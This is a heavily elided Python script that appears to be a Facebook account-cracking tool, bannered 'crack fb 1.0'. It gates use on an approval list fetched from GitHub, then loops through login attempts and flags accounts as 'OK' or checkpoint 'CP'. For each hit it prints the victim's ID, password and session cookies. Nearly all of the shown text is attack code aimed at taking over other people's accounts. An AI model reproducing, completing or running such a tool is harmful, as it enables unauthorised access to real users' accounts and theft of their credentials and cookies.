...
│    ──────────────────────────                                              crack fb 1.0      │
└──────────────────────────────────────────────────────────────────────────────────────────────┘  	
			{m} ☯︎ {k} ☯︎ {h} ☯︎ {sir} Code pathum{x}{m} ☯︎ {k} ☯︎ {h} ☯︎ {x}''')
...
def chk(): 
  ...
  print ("\033[1;92m╰────────────────────────────────────────────╯")
  try: 
    httpCaht = requests.get("https://github.com/Pathumsadaruwan849/Pathu1234/blob/main/Approval.txt").text 
    if id in httpCaht: 
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t( ͠° ͟ʖ ͡°) WELCOME 2 SAJJAD TOOLS : [green]🇨 🇴 🇰 🇮  [white] (;´༎ຶٹ༎ຶ`)'))
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='SAJJAD CP'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='SAJJAD OK'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]SAJJAD OK[/bold green]'))
					ok+=1
					break
			else:
				continue
